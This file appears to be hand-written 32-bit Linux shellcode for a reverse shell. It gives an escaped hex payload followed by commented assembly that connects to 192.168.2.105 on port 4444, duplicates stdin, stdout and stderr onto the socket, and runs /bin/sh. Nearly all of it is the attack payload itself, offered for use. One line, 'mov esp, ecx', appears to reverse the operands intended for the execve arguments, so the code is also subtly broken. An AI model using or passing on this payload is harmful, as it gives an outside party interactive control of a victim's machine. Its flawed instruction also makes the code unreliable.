;  \x31\xc0\x31\xdb\x50\xb0\x66\xb3\x01\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x68\xc0\xa8\x02\x69\x31\xdb\x66\xbb\x11\x5c\x66\x53\x31\xdb\xb3\x02\x66\x53\x89\xe3\x6a\x10\x53\x50\x89\xe1\x31\xdb\xb3\x03\x50\xb0\x66\xcd\x80\x31\xc0\x31\xc9\x5b\xb0\x3f\xb1\x02\xcd\x80\xb0\x3f\x49\xcd\x80\xb0\x3f\x49\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc0\x50\x53\x89\xcc\xb0\x0b\xcd\x80


section .text
global _start
_start:
	xor eax, eax
	xor ebx, ebx
	push eax        ; Flags
	mov al, 0x66    ; SYS_SOCKETCALL
	mov bl, 0x01    ; SYS_SOCKET = 1
	push 1          ; SOCKSTREAM
	push 2          ; AF_INET
	mov ecx, esp
	int 0x80

	push 0x6902a8c0 ; IP = 192.168.2.105
	xor ebx, ebx    
	mov bx, 0x5c11  ; PORT = 4444
	push bx	        ; Port -> Stack
	
	xor ebx, ebx
	mov bl, 0x02    ; AF_INET = 2
	push bx         ; Family -> Stack
	mov ebx, esp    ; Struct addr
	push 0x10       ; Struct size -> Stack
	push ebx        ; Struct addr -> Stack
	push eax        ; Socket fd   -> Stack		
	mov ecx, esp    ; Struct addr
	xor ebx, ebx	
	mov bl, 0x3
	push eax        ; Store socket fd
	mov al, 0x66    ; SYS_SOCKETCALL
	int 0x80

	xor eax, eax
	xor ecx, ecx
	pop ebx         ; SOCKET FD -> ebx
	mov al, 0x3f    ; SYS_DUP2
	mov cl, 0x2     ; STDERR
	int 0x80
	
	mov al, 0x3f    ; SYS_DUP2
	dec ecx         ; STDIN
	int 0x80	

	mov al, 0x3f    ; SYS_DUP2
	dec ecx         ; STDOUT
	int 0x80	
	
	xor eax, eax
	push eax        ; push terminating nullbyte
	push 0x68732f2f ; //sh
	push 0x6e69622f ; /bin
	mov ebx, esp    ; 
	xor eax, eax    ;
	push eax
	push ebx
	mov esp, ecx
	mov al, 0x0b
	int 0x80
